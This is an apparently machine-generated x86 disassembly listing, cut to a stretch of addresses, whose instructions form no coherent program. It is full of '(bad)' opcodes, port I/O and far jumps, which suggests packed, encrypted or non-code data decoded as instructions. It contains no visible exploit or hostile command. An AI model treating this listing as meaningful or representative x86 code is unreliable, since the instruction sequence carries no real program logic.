  419f3e:	adc    esp,DWORD PTR [ebx-0x32]
  419f41:	std    
  419f42:	mov    BYTE PTR [edx+0x20],0x6f
  419f46:	sub    eax,0x3190cc28
  419f4b:	jne    0x419ed8
  419f4d:	inc    ebx
  419f4e:	xchg   edi,eax
  419f4f:	lds    eax,FWORD PTR [ecx+eax*2-0x10]
  419f53:	dec    edx
  419f54:	adc    al,0x11
  419f56:	enter  0x197,0xc1
  419f5a:	outs   dx,DWORD PTR ds:[esi]
  419f5b:	sub    esi,ebp
  419f5d:	inc    ebx
  419f5e:	ja     0x419fd8
  419f60:	inc    dx
  419f62:	lock pop edi
  419f64:	dec    esp
  419f65:	mov    bh,0xcc
  419f67:	mov    ds:0x84bd0fda,eax
  419f6c:	pusha  
  419f6d:	mov    ecx,0x38086816
  419f72:	jne    0x419f35
  419f74:	fs jmp 0x77d1f9cc
  419f7a:	or     DWORD PTR [edi],esi
  419f7c:	dec    DWORD PTR [esi+ecx*2-0x5299921c]
  419f83:	fcmovbe st,st(3)
  419f85:	sbb    BYTE PTR [edx],dh
  419f87:	cmp    BYTE PTR [ebx+0x1b],al
  419f8a:	mov    ecx,0xfb6a7e2b
  419f8f:	mov    bl,0x5b
  419f91:	mov    esp,0x9b3b8aa
  419f96:	push   ebx
  419f97:	cmp    bh,BYTE PTR [edx]
  419f99:	mov    edx,DWORD PTR [edi+0x73]
  419f9c:	inc    esi
  419f9d:	inc    edx
  419f9e:	pop    ss
  419f9f:	arpl   WORD PTR [eax],bp
  419fa1:	loopne 0x419fa7
  419fa3:	push   es
  419fa4:	add    ah,BYTE PTR [ecx-0x32328ade]
  419faa:	sub    esp,DWORD PTR [ecx-0x6bcee1f8]
  419fb0:	jb     0x419f91
  419fb2:	imul   BYTE PTR [ecx]
  419fb4:	repz add BYTE PTR [eax],al
	...
  41a013:	add    BYTE PTR [eax],al
  41a015:	add    BYTE PTR [esi-0x15],cl
  41a018:	sub    cl,BYTE PTR [esi-0x51]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	lock xchg edi,ecx
  41a025:	jne    0x419fdb
  41a027:	adc    DWORD PTR [ecx],eax
  41a029:	add    BYTE PTR [edi],al
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [ecx+0x42b369a4],cl
  41a033:	lods   eax,DWORD PTR ds:[esi]
  41a034:	(bad)  
  41a035:	scas   al,BYTE PTR es:[edi]
  41a036:	mov    dl,0xc1
  41a038:	or     eax,0xc74e46b4
  41a03d:	mov    al,ds:0xfa0b6ef9
  41a042:	stos   BYTE PTR es:[edi],al
  41a043:	jle    0x41a062
  41a045:	jmp    0xeac9f543
  41a04a:	jo     0x419fea
  41a04c:	not    BYTE PTR ds:0x21042f39
  41a052:	icebp  
  41a053:	les    ecx,FWORD PTR [eax+0x29a7e9d9]
  41a059:	and    BYTE PTR [esi-0x4d638de9],dh
  41a05f:	enter  0x55be,0xfc
  41a063:	mov    ds:0xd989aa0e,eax
  41a068:	das    
  41a069:	test   al,0x6
  41a06b:	adc    al,0xb5
  41a06d:	div    DWORD PTR [ebp+0x4]
  41a070:	gs inc eax
  41a072:	push   ebp
  41a073:	push   0xffffffa0
  41a075:	mov    cs,WORD PTR [esi-0xca9fcaa]
  41a07b:	mov    ecx,0x4aefafb0
  41a080:	ror    DWORD PTR [esi],1
  41a082:	cmp    al,0xbc
  41a084:	(bad)  
  41a085:	mov    al,0x84
  41a087:	sub    DWORD PTR [edx-0x52309af7],eax
  41a08d:	mov    cl,0xaa
  41a08f:	dec    ecx
  41a090:	xor    BYTE PTR [edx-0x18287708],ch
  41a096:	sub    al,0x15
  41a098:	cmp    BYTE PTR [ecx-0x181835f1],0xb1
  41a09f:	jo     0x41a11b
  41a0a1:	inc    ebp
  41a0a2:	fldenv [ecx+ecx*2-0x1f568c20]
  41a0a9:	(bad)  
  41a0aa:	or     BYTE PTR [ebp-0x135a4b70],0xe2
  41a0b1:	ret    
  41a0b2:	pop    ds
  41a0b3:	ins    BYTE PTR es:[edi],dx
  41a0b4:	in     al,0x19
  41a0b6:	mov    edx,0xbcb5515f
  41a0bb:	adc    al,0x78
  41a0bd:	inc    eax
  41a0be:	inc    esi
  41a0bf:	xor    ah,BYTE PTR [edx+0x74]
  41a0c2:	and    DWORD PTR [esi+eax*1+0x1],ecx
  41a0c6:	ds jo  0x41a13f
  41a0c9:	and    ah,BYTE PTR ds:0x1b8c45c4
  41a0cf:	mov    cl,0x8f
  41a0d1:	push   0x22
  41a0d3:	jae    0x41a0d7
  41a0d5:	pop    eax
  41a0d6:	xor    BYTE PTR [edx+0x6acd8101],al
  41a0dc:	cmp    edi,DWORD PTR ds:0xfe8d156
  41a0e2:	add    BYTE PTR ds:[eax],bh
  41a0e5:	mov    dh,0xa2
  41a0e7:	pop    es
  41a0e8:	sbb    eax,0xd1a84bf7
  41a0ed:	sub    BYTE PTR [esi+eiz*1],dl
  41a0f0:	pop    ss
  41a0f1:	out    0x9f,eax
  41a0f3:	aas    
  41a0f4:	xor    DWORD PTR [eax],ebp
  41a0f6:	adc    eax,0xd00fa721
  41a0fb:	or     bl,BYTE PTR ds:0x5b710968
  41a101:	sbb    ebx,ebp
  41a103:	mov    edx,0x760a9064
  41a108:	xor    BYTE PTR [esi+esi*1+0x1ee28c8],bh
  41a10f:	repz mov ch,0x61
  41a112:	mov    bh,cl
  41a114:	in     eax,dx
  41a115:	inc    edi
  41a116:	stc    
  41a117:	nop
  41a118:	shl    ebp,0x1c
  41a11b:	adc    BYTE PTR [ebx-0x60],ah
  41a11e:	inc    esi
  41a11f:	cmp    DWORD PTR [ecx],0xa874032
  41a125:	adc    DWORD PTR [esi+eiz*1+0x4b],ebp
  41a129:	(bad)  
  41a12b:	add    DWORD PTR [edi-0x5616de39],ecx
  41a131:	cmp    bl,BYTE PTR [esi-0x45]
  41a134:	pop    DWORD PTR [eax]
	...
  41a196:	sbb    al,0xc
  41a198:	std    
  41a199:	sbb    ebp,edi
  41a19b:	stc    
  41a19c:	cld    
  41a19d:	or     eax,0xe0cd0383
  41a1a2:	push   esp
  41a1a3:	sahf   
  41a1a4:	pop    ss
  41a1a5:	loop   0x41a162
  41a1a7:	adc    al,BYTE PTR [ecx]
  41a1a9:	add    BYTE PTR [edi],al
  41a1ab:	add    DWORD PTR [eax],eax
  41a1ad:	add    BYTE PTR [eax+0xffd9367],bh
  41a1b3:	fbstp  TBYTE PTR [edi-0x1d8868f6]
  41a1b9:	test   BYTE PTR [edx+ecx*2],ah
  41a1bc:	mov    ds:0xa187c0d7,al
  41a1c1:	retf   0xd35d
  41a1c4:	push   cs
  41a1c5:	inc    ecx
  41a1c6:	fdivr  QWORD PTR [ebx-0x539ddc1f]
  41a1cc:	pop    esi
  41a1cd:	push   esp
  41a1ce:	cwde   
  41a1cf:	push   esi
  41a1d0:	xchg   ebp,eax
  41a1d1:	adc    eax,0xdb87bccd
  41a1d6:	xchg   edx,eax
  41a1d7:	test   al,0x11
  41a1d9:	pop    ss
  41a1da:	inc    ebx
  41a1db:	test   BYTE PTR [edi-0x4c],bh
  41a1de:	xchg   ebx,eax
  41a1df:	cmp    DWORD PTR [esi+0x775125cf],ebp
  41a1e5:	lock push cs
  41a1e7:	mov    esi,0x6e3903ee
  41a1ec:	and    al,BYTE PTR [ebp+ebx*4-0x23]
  41a1f0:	fist   WORD PTR [esp+eiz*8]
  41a1f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1f4:	dec    esi
  41a1f5:	jmp    0xd1d4:0xd25fd24b
  41a1fc:	rcr    DWORD PTR [eax+0x1e1ac868],cl
  41a202:	psubq  mm7,QWORD PTR [esi-0x2d5c92d6]
  41a209:	adc    dh,dl
  41a20b:	xor    dh,dl
  41a20d:	push   esp
  41a20e:	add    eax,0xd5995c08
  41a213:	pusha  
  41a214:	repz into 
  41a216:	ins    BYTE PTR es:[edi],dx
  41a217:	nop
  41a218:	push   ds
  41a219:	fadd   DWORD PTR [edi]
  41a21b:	lock daa 
  41a21d:	je     0x41a228
  41a21f:	loope  0x41a28c
  41a221:	jns    0x41a286
  41a223:	add    DWORD PTR [eax+0x63f9e6f],esi
  41a229:	jne    0x41a223
  41a22b:	or     eax,0xa92eab59
  41a230:	sbb    DWORD PTR [ecx+0x11],0xdc52baf3
  41a237:	sub    esp,DWORD PTR [ecx+0x2c]
  41a23a:	pop    esi
  41a23b:	iret   
  41a23c:	mov    ebx,0xd23eae7e
  41a241:	fst    DWORD PTR [ecx+0x619ebdb0]
  41a247:	fadd   st,st(1)
  41a249:	mov    ebx,0xbcaa5c4a
  41a24e:	repnz loope 0x41a268
  41a251:	xchg   edx,ecx
  41a253:	(bad)
  41a257:	in     eax,0xc8
  41a259:	mov    eax,ds:0xca01b87f
  41a25e:	inc    eax
  41a25f:	stc    
  41a260:	into   
  41a261:	(bad)  
  41a262:	lds    esi,FWORD PTR [ebx+0x40a8e329]
  41a268:	or     eax,0x3a1e0ccd
  41a26d:	and    eax,0xc2b26af0
  41a272:	ss (bad) 
  41a274:	lock mov ds:0xd81407bf,al
  41a27a:	mov    esi,0x8aac475e
  41a27f:	gs or  al,0x64
  41a282:	(bad)  
  41a283:	leave  
  41a284:	xor    eax,0xefcef0a6
  41a289:	pusha  
  41a28a:	pushf  
  41a28b:	bound  ecx,QWORD PTR [esi-0x590366d]
  41a291:	push   es
  41a292:	(bad)  
  41a293:	jle    0x41a26f
  41a295:	lea    ecx,[ebx]
  41a297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a298:	lods   eax,DWORD PTR ds:[esi]
  41a299:	push   cs
  41a29a:	(bad)  
  41a29b:	(bad)  
  41a29e:	or     DWORD PTR [eax+0x65201cbf],0x77
  41a2a5:	inc    esi
  41a2a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a7:	ins    DWORD PTR es:[edi],dx
  41a2a8:	popf   
  41a2a9:	xchg   esp,eax
  41a2aa:	push   edx
  41a2ab:	fsubp  st(1),st
  41a2ad:	and    ch,ch
  41a2af:	fs iret 
  41a2b1:	pop    edi
  41a2b2:	sbb    al,0x5a
  41a2b4:	fld    QWORD PTR [eax]
	...
  41a316:	neg    DWORD PTR [eax-0x58]
  41a319:	adc    ebp,DWORD PTR [edi+0x63fcfff3]
  41a31f:	fadd   st,st(1)
  41a321:	mov    al,0x20
  41a323:	fucom  st(4)
  41a325:	fadd   st,st(2)
  41a327:	adc    eax,DWORD PTR [ecx]
  41a329:	add    BYTE PTR [edi],al
  41a32b:	add    DWORD PTR [eax],eax
  41a32d:	add    BYTE PTR [ecx+0xeda81c6],dl
  41a333:	inc    ebp
  41a334:	jp     0x41a37f
  41a336:	hlt    
  41a337:	ds nop
  41a339:	loope  0x41a391
  41a33b:	fidivr DWORD PTR [ebx-0x66428333]
  41a341:	inc    ebp
  41a342:	retf   0xe2fd
  41a345:	cmp    al,0xbd
  41a347:	hlt    
  41a348:	je     0x41a328
  41a34a:	jo     0x41a398
  41a34c:	jb     0x41a375
  41a34e:	mov    ecx,0x7f62cf41
  41a353:	push   cs
  41a354:	push   ecx
  41a355:	nop
  41a356:	popf   
  41a357:	and    DWORD PTR [ebx+0x676c8195],edi
  41a35d:	push   edx
  41a35e:	mov    dh,0x7b
  41a360:	add    ah,dh
  41a362:	lea    edi,[ecx-0x314849e2]
  41a368:	and    ebx,ebp
  41a36a:	and    ebp,DWORD PTR [ebp+0x24]
  41a36d:	pop    ebp
  41a36e:	(bad)  
  41a370:	ret    0xc95d
  41a373:	lods   eax,DWORD PTR ds:[esi]
  41a374:	cld    
  41a375:	enter  0x406b,0x52
  41a379:	sti    
  41a37a:	or     edx,DWORD PTR [ebp+0x28ad2d85]
  41a380:	dec    esp
  41a381:	pop    ebp
  41a382:	mov    ebp,0x9bd5e12
  41a387:	sub    eax,edi
  41a389:	sub    cl,BYTE PTR [eax-0x68a74971]
  41a38f:	cmp    DWORD PTR [esi],esp
  41a391:	dec    esp
  41a392:	sti    
  41a393:	retf   
  41a394:	push   eax
  41a395:	jo     0x41a3e5
  41a397:	xchg   esp,eax
  41a398:	nop
  41a399:	sub    eax,0x70c12078
  41a39e:	(bad)  
  41a39f:	cmp    al,0x84
  41a3a1:	sbb    cl,BYTE PTR [ebx+0x37]
  41a3a4:	jl     0x41a388
  41a3a6:	sub    bl,BYTE PTR [ebx-0x75]
  41a3a9:	push   ds
  41a3aa:	xchg   ebx,eax
  41a3ab:	ins    DWORD PTR es:[edi],dx
  41a3ac:	jmp    0x160db1bf
  41a3b1:	js     0x41a409
  41a3b3:	clc    
  41a3b4:	dec    eax
  41a3b5:	rcr    cl,1
  41a3b7:	sub    al,0x6a
  41a3b9:	xchg   BYTE PTR ds:0xa209b762,dl
  41a3bf:	adc    edx,DWORD PTR [ebp+0x48]
  41a3c2:	inc    edx
  41a3c3:	out    0xf7,al
  41a3c5:	sbb    bh,BYTE PTR [edx+edx*1-0x790e9965]
  41a3cc:	dec    ecx
  41a3cd:	cmp    al,0xbe
  41a3cf:	xchg   ebp,eax
  41a3d0:	out    0xd0,al
  41a3d2:	les    ecx,FWORD PTR [eax-0x7b65afec]
  41a3d8:	jmp    0x41a36d
  41a3da:	mov    esi,0x8b82b66b
  41a3df:	inc    ebp
  41a3e0:	mov    cl,0xd3
  41a3e2:	jb     0x41a3a2
  41a3e4:	add    DWORD PTR [ebx-0x193c8295],edi
  41a3ea:	xor    esp,DWORD PTR [ecx+esi*4-0x11]
  41a3ee:	pop    esp
  41a3ef:	cdq    
  41a3f0:	js     0x41a3b9
  41a3f2:	adc    BYTE PTR ds:0x33031ac9,dh
  41a3f8:	test   DWORD PTR [ebx],ecx
  41a3fa:	les    esi,FWORD PTR [ebx+0x18]
  41a3fd:	pusha  
  41a3fe:	and    BYTE PTR [ecx-0x6fb3f818],cl
  41a404:	or     al,BYTE PTR [edi]
  41a406:	pusha  
  41a407:	dec    edx
  41a408:	hlt    
  41a409:	retf   0x9408
  41a40c:	jmp    0xffc8:0xc74d7f83
  41a413:	repz xor eax,0xb6ed9b3a
  41a419:	jmp    0x483f3eb9
  41a41e:	xor    DWORD PTR [esp+ecx*4-0x56],0xf295e8d
  41a426:	pusha  
  41a427:	test   al,0x82
  41a429:	pop    DWORD PTR [ebx-0x2b]
  41a42c:	lock std 
  41a42e:	popa   
  41a42f:	daa    
  41a430:	pop    esi
  41a431:	xchg   ebp,eax
  41a432:	lods   eax,DWORD PTR ds:[esi]
  41a433:	jmp    0x41a4aa
	...
  41a495:	add    BYTE PTR [edi-0xf0307e],bh
  41a49b:	dec    edi
  41a49c:	push   DWORD PTR [edx+0x6df04d13]
  41a4a2:	push   edi
  41a4a3:	repnz sbb eax,0x114c944
  41a4a9:	add    BYTE PTR [edi],al
  41a4ab:	add    DWORD PTR [eax],eax
  41a4ad:	add    BYTE PTR [esi+0x1],ah
  41a4b0:	inc    edi
  41a4b1:	aaa    
  41a4b2:	pop    ebx
  41a4b3:	ror    DWORD PTR [ecx+0x402442be],0xad
  41a4ba:	cdq    
  41a4bb:	mov    edx,DWORD PTR [edx+ebp*1+0x36]
  41a4bf:	test   al,0xa4
  41a4c1:	jge    0x41a531
  41a4c3:	push   eax
  41a4c4:	mov    ch,0x2d
  41a4c6:	push   esi
  41a4c7:	mov    ebp,DWORD PTR [esi+0x35ef8c29]
  41a4cd:	(bad)  
  41a4ce:	lahf   
  41a4cf:	sbb    eax,0xb7b6a05f
  41a4d4:	test   al,0xb3
  41a4d6:	pop    ss
  41a4d7:	dec    ebp
  41a4d8:	mov    ebx,ecx
  41a4da:	mov    edi,0x8a764335
  41a4df:	adc    DWORD PTR [eax+0x5da4ba7e],esp
  41a4e5:	es stos DWORD PTR es:[edi],eax
  41a4e7:	mov    esi,0x4e0774af
  41a4ec:	call   0xf0d2:0x22866e48
  41a4f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4f4:	pusha  
  41a4f5:	or     ah,ah
  41a4f7:	mov    eax,ds:0x99484393
  41a4fc:	xor    DWORD PTR [ebx-0x5a40ab72],edi
  41a502:	je     0x41a4df
  41a504:	shl    BYTE PTR ds:0xbb5520b1,cl
  41a50a:	jo     0x41a4e3
  41a50c:	cld    
  41a50d:	inc    eax
  41a50e:	push   0xffffffc2
  41a510:	test   dl,al
  41a512:	cli    
  41a513:	into   
  41a514:	or     DWORD PTR [edi+0x25baae6],esp
  41a51a:	mov    eax,ds:0xe75409a3
  41a51f:	inc    edi
  41a520:	adc    ah,BYTE PTR [ecx+0x73]
  41a523:	lods   al,BYTE PTR ds:[esi]
  41a524:	outs   dx,DWORD PTR ds:[esi]
  41a525:	mov    esi,0xd36398b
  41a52a:	inc    ebx
  41a52b:	push   edx
  41a52c:	sbb    cl,BYTE PTR [ebx+0x3a]
  41a52f:	mov    edx,0x89699312
  41a534:	mov    dl,0xa6
  41a536:	cmp    eax,0x4ceae070
  41a53b:	loop   0x41a4c0
  41a53d:	pop    ebp
  41a53e:	jae    0x41a4d7
  41a540:	push   eax
  41a541:	dec    esp
  41a542:	add    ecx,DWORD PTR ds:0x8d548965
  41a548:	cmp    al,BYTE PTR [eax]
  41a54a:	pushw  ss
  41a54c:	mov    al,0xac
  41a54e:	pop    esp
  41a54f:	mov    ah,0x3c
  41a551:	add    ebp,DWORD PTR [ebp-0x2ccc1cf3]
  41a557:	mov    BYTE PTR [ecx-0x7d83e68a],0x36
  41a55e:	or     ebx,DWORD PTR [esi+esi*8]
  41a561:	(bad)  
  41a562:	out    dx,eax
  41a563:	sub    eax,DWORD PTR [ebx+ebx*2-0x51dfa0ba]
  41a56a:	add    al,0xdd
  41a56c:	retf   0x1995
  41a56f:	stos   DWORD PTR es:[edi],eax
  41a570:	pop    es
  41a571:	jbe    0x41a513
  41a573:	int    0xf5
  41a575:	push   esp
  41a576:	lea    esi,[ebx-0x3d]
  41a579:	outs   dx,BYTE PTR ds:[esi]
  41a57a:	icebp  
  41a57b:	inc    ebx
  41a57c:	out    dx,al
  41a57d:	xchg   ebx,eax
  41a57e:	pop    es
  41a57f:	adc    al,BYTE PTR [ebx+0x1d891bfa]
  41a585:	push   edi
  41a586:	rol    DWORD PTR [edx-0x6e],1
  41a589:	cld    
  41a58a:	out    dx,eax
  41a58b:	imul   esp,DWORD PTR [ebx+0x1b],0x3c
  41a58f:	adc    DWORD PTR [edi],ebp
  41a591:	fnstsw WORD PTR [eax-0x43]
  41a594:	out    dx,eax
  41a595:	jmp    0xc7cb:0xb46da357
  41a59c:	and    al,0x7
  41a59e:	gs adc bh,ch
  41a5a1:	jp     0x41a52a
  41a5a3:	mov    ds:0x9fd4a06c,eax
  41a5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a9:	fimul  WORD PTR [edi]
  41a5ab:	scas   al,BYTE PTR es:[edi]
  41a5ac:	ins    BYTE PTR es:[edi],dx
  41a5ad:	cmp    eax,0xe7d603d
  41a5b2:	sub    DWORD PTR [ecx+0x4d],0x0
	...
  41a615:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41a619:	inc    ecx
  41a61a:	ja     0x41a687
  41a61c:	pop    esp
  41a61d:	aas    
  41a61e:	pop    ecx
  41a61f:	jmp    0x41a5e9
  41a621:	mov    edx,0xe074ae17
  41a626:	rcl    BYTE PTR ds:0x1070001,1
  41a62c:	add    BYTE PTR [eax],al
  41a62e:	stc    
  41a62f:	pop    edx
  41a630:	jmp    0xd868:0xc59b2065
  41a637:	icebp  
  41a638:	jnp    0x41a6a0
  41a63a:	mov    BYTE PTR [esi-0x27],ah
  41a63d:	pop    ss
  41a63e:	call   0xf703:0xc662c07c
  41a645:	ror    DWORD PTR [esi-0x4e],cl
  41a648:	cwde   
  41a649:	push   es
  41a64a:	dec    ecx
  41a64b:	fnstenv [eax-0x54]
  41a64e:	stos   BYTE PTR es:[edi],al
  41a64f:	in     al,0xd5
  41a651:	mov    eax,ds:0x77707654
  41a656:	jmp    0xa3d0:0xf45ede09
  41a65d:	loopne 0x41a62f
  41a65f:	test   eax,0x82474d67
  41a664:	lods   eax,DWORD PTR ds:[esi]
  41a665:	and    dh,cl
  41a667:	test   DWORD PTR [ebx-0x7f],edi
  41a66a:	mov    eax,DWORD PTR [edi]
  41a66c:	loope  0x41a646
  41a66e:	and    esi,ecx
  41a670:	mov    edx,0xc45f4ff8
  41a675:	rol    eax,1
  41a677:	jne    0x41a63d
  41a679:	ins    BYTE PTR es:[edi],dx
  41a67a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a67b:	test   DWORD PTR [ecx+0x23f8bd8f],ecx
  41a681:	or     al,BYTE PTR [edi+0x5b]
  41a684:	xchg   edx,eax
  41a685:	sub    eax,0xddd9ab01
  41a68a:	adc    ch,BYTE PTR [eax+0x44fb74a0]
  41a690:	cld    
  41a691:	enter  0x5d6e,0xa9
  41a695:	aam    0xd5
  41a697:	retf   
  41a698:	sub    BYTE PTR [edi],dl
  41a69a:	dec    ebp
  41a69b:	cdq    
  41a69c:	stos   DWORD PTR es:[edi],eax
  41a69d:	call   0xa0627bda
  41a6a2:	mov    ds:0x9ba10a7e,ax
  41a6a8:	sbb    DWORD PTR [edi+0x4a],esi
  41a6ab:	mov    edx,0x332a1592
  41a6b0:	loopne 0x41a63f
  41a6b2:	sbb    eax,DWORD PTR [ebx-0x78]
  41a6b5:	add    eax,0x6b2c9db8
  41a6ba:	test   dl,ch
  41a6bc:	nop
  41a6bd:	fnstcw WORD PTR [ebx+0xc]
  41a6c0:	shl    BYTE PTR ds:[ecx+0x4c],cl
  41a6c4:	cmp    dl,bh
  41a6c6:	mov    eax,ds:0x437e9b2f
  41a6cb:	jmp    0xb19b:0xd011b040
  41a6d2:	test   DWORD PTR [eax+0x1d],edi
  41a6d5:	xchg   edi,eax
  41a6d6:	outs   dx,BYTE PTR ds:[esi]
  41a6d7:	popf   
  41a6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6d9:	(bad)
  41a6dd:	out    0x10,eax
  41a6df:	stc    
  41a6e0:	dec    esi
  41a6e1:	outs   dx,DWORD PTR ds:[esi]
  41a6e2:	pop    ecx
  41a6e3:	imul   ebx,DWORD PTR [eax-0x6f04e026],0xc0c6e240
  41a6ed:	mov    ecx,DWORD PTR [ebp+0x5c8f547c]
  41a6f3:	mov    eax,ds:0xc2d65877
  41a6f8:	leave  
  41a6f9:	push   edx
  41a6fa:	add    bh,dh
  41a6fc:	push   esi
  41a6fd:	xchg   ecx,eax
  41a6fe:	dec    edi
  41a6ff:	mov    eax,0xcdf260e1
  41a704:	sub    edx,ecx
  41a706:	les    edx,FWORD PTR [eax+0x6e]
  41a709:	jecxz  0x41a6ff
  41a70b:	stos   BYTE PTR es:[edi],al
  41a70c:	xchg   ecx,eax
  41a70d:	rcl    cl,1
  41a70f:	hlt    
  41a710:	add    edx,DWORD PTR [esi+0x27eb782d]
  41a716:	jno    0x41a6ef
  41a718:	into   
  41a719:	xor    al,0x79
  41a71b:	or     al,BYTE PTR [esi+0x10]
  41a71e:	add    DWORD PTR [edi],0x7e621014
  41a724:	mov    ah,0x87
  41a726:	mov    ebp,ds
  41a728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a729:	addr16 mov edi,0x7d8ba003
  41a72f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a730:	dec    esp
  41a731:	mov    esp,0x39d89d
	...
  41a796:	repz xchg edi,eax
  41a798:	jae    0x41a721
  41a79a:	ja     0x41a783
  41a79c:	div    edi
  41a79e:	fisttp QWORD PTR [ebx+0x194d50a8]
  41a7a4:	loope  0x41a7d5
  41a7a6:	xlat   BYTE PTR ds:[ebx]
  41a7a7:	push   ss
  41a7a8:	add    DWORD PTR [eax],eax
  41a7aa:	pop    es
  41a7ab:	add    DWORD PTR [eax],eax
  41a7ad:	add    BYTE PTR [edx-0x7],al
  41a7b0:	sbb    al,0xb8
  41a7b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7b3:	and    esi,esi
  41a7b5:	push   edi
  41a7b6:	call   0xcacc4773
  41a7bb:	cs scas eax,DWORD PTR es:[edi]
  41a7bd:	imul   ecx,ebx,0x2e
  41a7c0:	mov    ds:0xedcf7319,al
  41a7c5:	popf   
  41a7c6:	cmp    esi,esi
  41a7c8:	cmp    DWORD PTR [eax-0x15],0x6a
  41a7cc:	iret   
  41a7cd:	je     0x41a77c
  41a7cf:	add    WORD PTR [edx],0x53
  41a7d3:	mov    edx,DWORD PTR [eax+ebx*4-0x71]
  41a7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7d8:	xor    al,0xed
  41a7da:	repz jns 0x41a7e9
  41a7dd:	mov    ebp,DWORD PTR [ebx]
  41a7df:	sbb    DWORD PTR [esp+ecx*1-0x28],0xffffff92
  41a7e4:	sbb    edi,DWORD PTR [edx]
  41a7e6:	xchg   edi,eax
  41a7e7:	or     cl,bl
  41a7e9:	push   ds
  41a7ea:	lea    edx,[ecx+0x52f77301]
  41a7f0:	cmp    BYTE PTR [ebx],bh
  41a7f2:	sbb    esi,DWORD PTR [edi+0x1fc58884]
  41a7f8:	nop
  41a7f9:	retf   
  41a7fa:	cdq    
  41a7fb:	xchg   esi,esi
  41a7fd:	bound  ecx,QWORD PTR [eax]
  41a7ff:	mov    esp,0x3bbbbd5b
  41a804:	stos   BYTE PTR es:[edi],al
  41a805:	jge    0x41a7c0
  41a807:	xchg   esi,eax
  41a808:	call   0x9c8d55b0
  41a80d:	lock xor ebp,edi
  41a810:	je     0x41a87c
  41a812:	mov    cl,0xf4
  41a814:	push   ds
  41a815:	fsubr  QWORD PTR [esi]
  41a817:	scas   eax,DWORD PTR es:[edi]
  41a818:	xchg   esp,eax
  41a819:	sub    ah,bh
  41a81b:	jbe    0x41a80f
  41a81d:	xor    DWORD PTR [edx-0x6e],ebp
  41a820:	sahf   
  41a821:	push   esi
  41a822:	and    esp,eax
  41a824:	dec    ecx
  41a825:	inc    ebx
  41a826:	cs adc al,0xda
  41a829:	enter  0x7232,0x1e
  41a82d:	popf   
  41a82e:	mov    ebx,0x96ca7fd0
  41a833:	add    bh,dl
  41a835:	pop    edx
  41a836:	retf   
  41a837:	call   0xf076:0xef1b4dea
  41a83e:	mov    edi,0x8d2d1cbd
  41a843:	addr16 push eax
  41a845:	push   edx
  41a846:	add    bh,dh
  41a848:	push   esi
  41a849:	pop    edi
  41a84a:	sbb    ah,dl
  41a84c:	push   eax
  41a84d:	cmp    DWORD PTR [ebx+0x3d],esi
  41a850:	sub    DWORD PTR [esp+esi*1+0x6c947f24],esp
  41a857:	cli    
  41a858:	adc    esi,DWORD PTR [ecx-0x1850d7a3]
  41a85e:	arpl   WORD PTR [edi+0x59],sp
  41a861:	inc    edx
  41a862:	cld    
  41a863:	test   eax,0x438a6fa8
  41a868:	cmp    ebp,DWORD PTR [eax+0x6d]
  41a86b:	fs inc eax
  41a86d:	sub    cl,BYTE PTR [edi-0x50]
  41a870:	in     al,dx
  41a871:	sbb    al,BYTE PTR ds:0xfb60500e
  41a877:	fwait
  41a878:	outs   dx,DWORD PTR ds:[esi]
  41a879:	retf   
  41a87a:	clc    
  41a87b:	pop    ebx
  41a87c:	push   eax
  41a87d:	mov    ecx,0xba829f88
  41a882:	ret    
  41a883:	and    eax,0x361e8532
  41a888:	cmc    
  41a889:	mov    bh,0xe1
  41a88b:	jmp    0x41a906
  41a88d:	lods   al,BYTE PTR es:[esi]
  41a88f:	loop   0x41a8f1
  41a891:	and    esp,DWORD PTR [edx]
  41a893:	xlat   BYTE PTR ds:[ebx]
  41a894:	(bad)  
  41a895:	pop    dx
  41a897:	push   eax
  41a898:	xchg   esi,eax
  41a899:	jp     0x41a8fe
  41a89b:	ror    BYTE PTR [ebp-0x12],cl
  41a89e:	mov    ds:0x8087d97f,eax
  41a8a3:	xchg   esp,eax
  41a8a4:	fsubr  DWORD PTR [ebx+0xf1facb1]
  41a8aa:	jnp    0x41a84a
  41a8ac:	fist   WORD PTR [edi+eax*4]
  41a8af:	test   al,0xbf
  41a8b1:	pop    edi
  41a8b2:	test   DWORD PTR [ecx+edx*2+0x0],ebp
	...
  41a916:	xor    eax,0xcf4a867e
  41a91b:	cli    
  41a91c:	std    
  41a91d:	jg     0x41a90a
  41a91f:	mov    ds:0xee2323e,al
  41a924:	test   al,0xcc
  41a926:	ficom  WORD PTR [edi]
  41a928:	add    DWORD PTR [eax],eax
  41a92a:	pop    es
  41a92b:	add    DWORD PTR [eax],eax
  41a92d:	add    BYTE PTR [edx+0x2f2b402],ch
  41a933:	in     eax,0x1c
  41a935:	into   
  41a936:	sbb    BYTE PTR [ebx+0x1],al
  41a939:	push   edi
  41a93a:	fbstp  TBYTE PTR [ecx]
  41a93c:	scas   al,BYTE PTR es:[edi]
  41a93d:	jle    0x41a901
  41a93f:	add    eax,0x18491d16
  41a944:	out    0x8,eax
  41a946:	shl    DWORD PTR ds:0xc7a2b2,1
  41a94c:	push   ebx
  41a94d:	jg     0x41a939
  41a94f:	mov    ds,eax
  41a951:	or     dh,ah
  41a953:	jmp    0xc2e2d7
  41a958:	cdq    
  41a959:	jmp    0x41a9a9
  41a95b:	out    0x18,eax
  41a95d:	adc    DWORD PTR [esi+eax*8+0x531d63ad],ebp
  41a964:	jp     0x41a8e9
  41a966:	and    ah,bl
  41a968:	in     eax,dx
  41a969:	dec    ecx
  41a96a:	adc    edx,edi
  41a96c:	push   ecx
  41a96d:	dec    edx
